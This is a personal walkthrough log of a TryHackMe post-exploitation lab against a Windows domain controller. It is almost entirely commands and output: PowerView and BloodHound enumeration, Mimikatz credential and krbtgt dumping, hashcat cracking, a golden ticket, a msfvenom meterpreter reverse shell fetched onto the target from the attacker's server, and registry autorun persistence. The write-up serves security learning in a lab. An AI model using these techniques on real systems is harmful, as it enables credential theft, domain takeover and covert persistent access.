# Post-Exploitation Basics

https://tryhackme.com/room/postexploit

## nmap

```
joshua@kaligra:~/Documents/thm/postexploit$ cat 01_nmap
# Nmap 7.92 scan initiated Wed Jul 27 09:04:25 2022 as: nmap -T4 -p- -oN 01_nmap 10.10.129.251
Nmap scan report for 10.10.129.251
Host is up (0.055s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49685/tcp open  unknown
49690/tcp open  unknown
49711/tcp open  unknown
49714/tcp open  unknown
49717/tcp open  unknown

# Nmap done at Wed Jul 27 09:05:45 2022 -- 1 IP address (1 host up) scanned in 79.42 seconds
```

## RDP

```
$ xfreerdp /v:10.10.121.79 /u:Administrator /d:CONTROLLER /p:P@$$W0rd
```

or

```
$ rdesktop -u Administrator -d CONTROLLER 10.10.121.79 -p 'P@$$W0rd'
```

## SSH

```
joshua@kaligra:~/Documents/thm/postexploit$ ssh administrator@10.10.129.251
The authenticity of host '10.10.129.251 (10.10.129.251)' can't be established.
ED25519 key fingerprint is SHA256:WGyVsv2zGcSJEHIwp99EmFf5p6Q49BhKyHfmoVOGCAg.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.129.251' (ED25519) to the list of known hosts.
administrator@10.10.129.251's password:
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

controller\administrator@DOMAIN-CONTROLL C:\Users\Administrator>
```

## User Enum

```
PS C:\Users\Administrator\Downloads> import-module .\PowerView.ps1
PS C:\Users\Administrator\Downloads> Get-NetUser | select cn

cn
--
Administrator
Guest
krbtgt
Machine-1
Admin2
Machine-2
SQL Service
POST{P0W3RV13W_FTW}
sshd
```

## Groups enum

```
PS C:\Users\Administrator\Downloads> Get-NetGroup -GroupName *admin*
Administrators
Hyper-V Administrators
Storage Replica Administrators
Schema Admins
Enterprise Admins
Domain Admins
Key Admins
Enterprise Key Admins
DnsAdmins
```

## List shares

```
PS C:\Users\Administrator\Downloads> Invoke-ShareFinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
```

## List OSes

```
PS C:\Users\Administrator\Downloads> get-netcomputer -Fulldata | select OperatingSystem

operatingsystem
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation
```

## Start neo4j

```
root@kaligra:~# neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /usr/share/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /usr/share/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /usr/share/neo4j/run
Starting Neo4j.
2022-07-27 07:30:02.879+0000 INFO  Starting...
2022-07-27 07:30:04.605+0000 INFO  This instance is ServerId{913986ef} (913986ef-d9f1-4342-a792-e43749192736)
2022-07-27 07:30:08.030+0000 INFO  ======== Neo4j 4.4.7 ========
2022-07-27 07:30:11.104+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2022-07-27 07:30:11.107+0000 INFO  Updating the initial password in component 'security-users'
2022-07-27 07:30:15.096+0000 INFO  Bolt enabled on localhost:7687.
2022-07-27 07:30:17.444+0000 INFO  Remote interface available at http://localhost:7474/
2022-07-27 07:30:17.449+0000 INFO  id: E47D118A4D2FA16775F67A3496F791648F733EDB8DCB4D52E5D6E84A5A21C87F
2022-07-27 07:30:17.449+0000 INFO  name: system
2022-07-27 07:30:17.450+0000 INFO  creationDate: 2022-06-29T09:57:24.77Z
2022-07-27 07:30:17.450+0000 INFO  Started.
```

## Collecting data (failed attempt, see after)

```
PS C:\Users\Administrator\Downloads> import-module .\SharpHound.ps1
PS C:\Users\Administrator\Downloads> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
------------------------------------------------
Initializing SharpHound at 12:26 AM on 7/27/2022
------------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL
PS C:\Users\Administrator\Downloads> [+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 103 MB RAM
Status: 66 objects finished (+66 8)/s -- Using 107 MB RAM
Enumeration finished in 00:00:00.7226875
Compressing data to C:\Users\Administrator\Downloads\20220727002647_loot.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 12:26 AM on 7/27/2022! Happy Graphing!


PS C:\Users\Administrator\Downloads>
```

## Transfer to attack box

```
joshua@kaligra:~/Documents/thm/postexploit$ scp Administrator@10.10.129.251:20220727002647_loot.zip .
Administrator@10.10.129.251's password:
20220727002647_loot.zip
```

## Collection data again

I was unable to import data on `BloodHound`, so I uploaded `SharpHound.exe`:

```
PS C:\Users\Administrator> .\SharpHound.exe -c All --zipfilename CONTROLLER
2022-07-27T00:42:29.6864254-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PS
Remote
2022-07-27T00:42:29.6864254-07:00|INFORMATION|Initializing SharpHound at 12:42 AM on 7/27/2022
2022-07-27T00:42:29.8895425-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-07-27T00:42:30.0926648-07:00|INFORMATION|Beginning LDAP search for CONTROLLER.local
2022-07-27T00:42:30.1239161-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-07-27T00:42:30.1707934-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-07-27T00:43:00.7348695-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
2022-07-27T00:43:13.9845376-07:00|INFORMATION|Consumers finished, closing output channel
2022-07-27T00:43:14.0157727-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-07-27T00:43:14.1564127-07:00|INFORMATION|Status: 104 objects finished (+104 2.363636)/s -- Using 42 MB RAM
2022-07-27T00:43:14.1564127-07:00|INFORMATION|Enumeration finished in 00:00:44.0726154
2022-07-27T00:43:14.2814192-07:00|INFORMATION|SharpHound Enumeration Completed at 12:43 AM on 7/27/2022! Happy Graphing!
```

## Find Domain Admins

![12_find_domain_admin](https://user-images.githubusercontent.com/42389836/181279565-e4b26eda-95dd-4e3c-967d-ba524cc3b7a7.png)

## Find shortest path to high value target

![13_shortest_path_high_value](https://user-images.githubusercontent.com/42389836/181279723-9db92af9-03c3-4a5f-a823-2c689b04c32a.png)

## Dump hashes with Mimikatz

```
PS C:\Users\Administrator\Downloads> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 May  2 2020 16:23:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::lsa /patch
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 5508500012cc005cf7082a9a89ebdfdf

RID  : 0000044f (1103)
User : Machine1
LM   :
NTLM : 64f12cddaa88057e06a81b54e73b949b

RID  : 00000451 (1105)
User : Admin2
LM   :
NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

RID  : 00000452 (1106)
User : Machine2
LM   :
NTLM : c39f2beb3d2ec06a62cb887fb391dee0

RID  : 00000453 (1107)
User : SQLService
LM   :
NTLM : f4ab68f27303bcb4024650d8fc5f973a

RID  : 00000454 (1108)
User : POST
LM   :
NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2

RID  : 00000457 (1111)
User : sshd
LM   :
NTLM : 2777b7fec870e04dda00cd7260f7bee6

RID  : 000003e8 (1000)
User : DOMAIN-CONTROLL$
LM   :
NTLM : dff617d5bc2cabefb8832a129a8bcbf7

RID  : 00000455 (1109)
User : DESKTOP-2$
LM   :
NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

RID  : 00000456 (1110)
User : DESKTOP-1$
LM   :
NTLM : 7d33346eeb11a4f12a6c201faaa0d89a
```

## Machine1 password

```
joshua@kaligra:~/Documents/thm/postexploit$ hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770K CPU @ 3.50GHz, 1441/2947 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

64f12cddaa88057e06a81b54e73b949b:Password1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 64f12cddaa88057e06a81b54e73b949b
Time.Started.....: Wed Jul 27 09:54:12 2022 (0 secs)
Time.Estimated...: Wed Jul 27 09:54:12 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   165.6 kH/s (0.05ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3584/14344385 (0.02%)
Rejected.........: 0/3584 (0.00%)
Restore.Point....: 3072/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adriano -> fresa
Hardware.Mon.#1..: Util: 36%

Started: Wed Jul 27 09:54:08 2022
Stopped: Wed Jul 27 09:54:14 2022
```

## Machine2 password

```
joshua@kaligra:~/Documents/thm/postexploit$ hashcat -m 1000 c39f2beb3d2ec06a62cb887fb391dee0 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-4770K CPU @ 3.50GHz, 1441/2947 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c39f2beb3d2ec06a62cb887fb391dee0:Password2

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: c39f2beb3d2ec06a62cb887fb391dee0
Time.Started.....: Wed Jul 27 09:54:56 2022 (0 secs)
Time.Estimated...: Wed Jul 27 09:54:56 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1132.6 kH/s (0.09ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 54272/14344385 (0.38%)
Rejected.........: 0/54272 (0.00%)
Restore.Point....: 53760/14344385 (0.37%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ilegal -> 250984
Hardware.Mon.#1..: Util: 50%

Started: Wed Jul 27 09:54:54 2022
Stopped: Wed Jul 27 09:54:58 2022
```

## KRBTGT

```
mimikatz # lsadump::lsa /inject /name:krbtgt
Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 5508500012cc005cf7082a9a89ebdfdf
    LM   :
  Hash NTLM: 5508500012cc005cf7082a9a89ebdfdf
    ntlm- 0: 5508500012cc005cf7082a9a89ebdfdf
    lm  - 0: 372f405db05d3cafd27f8e6a4a097b2c

 * WDigest
    01  49a8de3b6c7ae1ddf36aa868e68cd9ea
    02  7902703149b131c57e5253fd9ea710d0
    03  71288a6388fb28088a434d3705cc6f2a
    04  49a8de3b6c7ae1ddf36aa868e68cd9ea
    05  7902703149b131c57e5253fd9ea710d0
    06  df5ad3cc1ff643663d85dabc81432a81
    07  49a8de3b6c7ae1ddf36aa868e68cd9ea
    08  a489809bd0f8e525f450fac01ea2054b
    09  19e54fd00868c3b0b35b5e0926934c99
    10  4462ea84c5537142029ea1b354cd25fa
    11  6773fcbf03fd29e51720f2c5087cb81c
    12  19e54fd00868c3b0b35b5e0926934c99
    13  52902abbeec1f1d3b46a7bd5adab3b57
    14  6773fcbf03fd29e51720f2c5087cb81c
    15  8f2593c344922717d05d537487a1336d
    16  49c009813995b032cc1f1a181eaadee4
    17  8552f561e937ad7c13a0dca4e9b0b25a
    18  cc18f1d9a1f4d28b58a063f69fa54f27
    19  12ae8a0629634a31aa63d6f422a14953
    20  b6392b0471c53dd2379dcc570816ba10
    21  7ab113cb39aa4be369710f6926b68094
    22  7ab113cb39aa4be369710f6926b68094
    23  e38f8bc728b21b85602231dba189c5be
    24  4700657dde6382cd7b990fb042b00f9e
    25  8f46d9db219cbd64fb61ba4fdb1c9ba7
    26  36b6a21f031bf361ce38d4d8ad39ee0f
    27  e69385ee50f9d3e105f50c61c53e718e
    28  ca006400aefe845da46b137b5b50f371
    29  15a607251e3a2973a843e09c008c32e3

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 64ef5d43922f3b5d

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d
      aes128_hmac       (4096) : 7eb35bddd529c0614e5ad9db4c798066
      des_cbc_md5       (4096) : 64ef5d43922f3b5d

 * NTLM-Strong-NTOWF
    Random Value : 666caaaaf30081f30211bd7fa445fec4
```

So far we have:

SID: S-1-5-21-849420856-2351964222-986696166

user: krbtgt

NTLM: 5508500012cc005cf7082a9a89ebdfdf

## Golden ticket

```
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
User      : Administrator
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-849420856-2351964222-986696166
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_nt
Lifetime  : 7/27/2022 12:59:51 AM ; 7/24/2032 12:59:51 AM ; 7/24/2032 12:59:51 AM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz #
```


## CMD

```
mimikatz # misc::cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6D2F143B8
```

![20_cmd](https://user-images.githubusercontent.com/42389836/181280701-d5d4591a-b469-46da-bafd-34abd5aeed90.png)

## SQLService description

```
PS C:\Users\Administrator> Get-ADUser -identity SQLservice -properties Description


Description       : My password is MYpassword123#
DistinguishedName : CN=SQL Service,CN=Users,DC=CONTROLLER,DC=local
Enabled           : True
GivenName         : SQL
Name              : SQL Service
ObjectClass       : user
ObjectGUID        : 1c3f20d7-c383-466a-9a67-92a774650cb8
SamAccountName    : SQLService
SID               : S-1-5-21-849420856-2351964222-986696166-1107
Surname           : Service
UserPrincipalName : SQLService@CONTROLLER.local



PS C:\Users\Administrator>
```


![21](https://user-images.githubusercontent.com/42389836/181280862-3cab83a2-4eda-49b9-b98b-0281e5c2f861.png)

## Create meterpreter payload

```
joshua@kaligra:~/Documents/thm/postexploit$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.8.147.132 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

## Python web server

```
joshua@kaligra:~/Documents/thm/postexploit$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## Trasfer to victim machine

```
PS C:\Users\Administrator> iwr http://10.8.147.132:8000/shell.exe -o shell.exe
PS C:\Users\Administrator>
```

## MSFCONSOLE multi handler

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.8.147.132
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.147.132:4444
```

## Run shell.exe on target, got shell

```
[*] Sending stage (175686 bytes) to 10.10.121.79
[*] Meterpreter session 1 opened (10.8.147.132:4444 -> 10.10.121.79:49977) at 2022-07-27 16:13:06 +0200
```

## Persistence

```
msf6 exploit(multi/handler) > use exploit/windows/local/persistence
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/persistence) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                 Connection
  --  ----  ----                     -----------                                 ----------
  1         meterpreter x86/windows  CONTROLLER\Administrator @ DOMAIN-CONTROLL  10.8.147.132:4444 -> 10.10.121.79:49977 (10.10.121.79)


msf6 exploit(windows/local/persistence) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/persistence) > run

[*] Running persistent module against DOMAIN-CONTROLL via session ID: 1
[+] Persistent VBS script written on DOMAIN-CONTROLL to C:\Users\ADMINI~1\AppData\Local\Temp\HKTWzJwefmr.vbs
[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\KGXmzTB
[+] Installed autorun on DOMAIN-CONTROLL as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\KGXmzTB
[*] Clean up Meterpreter RC file: /home/joshua/.msf4/logs/persistence/DOMAIN-CONTROLL_20220727.1349/DOMAIN-CONTROLL_20220727.1349.rc
```

## Close session, start hanlder again

```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.8.147.132
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.8.147.132     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.8.147.132:4444
```

## Reboot target and access through RDP

```
[*] Sending stage (175686 bytes) to 10.10.121.79
[*] Meterpreter session 1 opened (10.8.147.132:4444 -> 10.10.121.79:49737) at 2022-07-27 16:45:26 +0200

meterpreter >
```










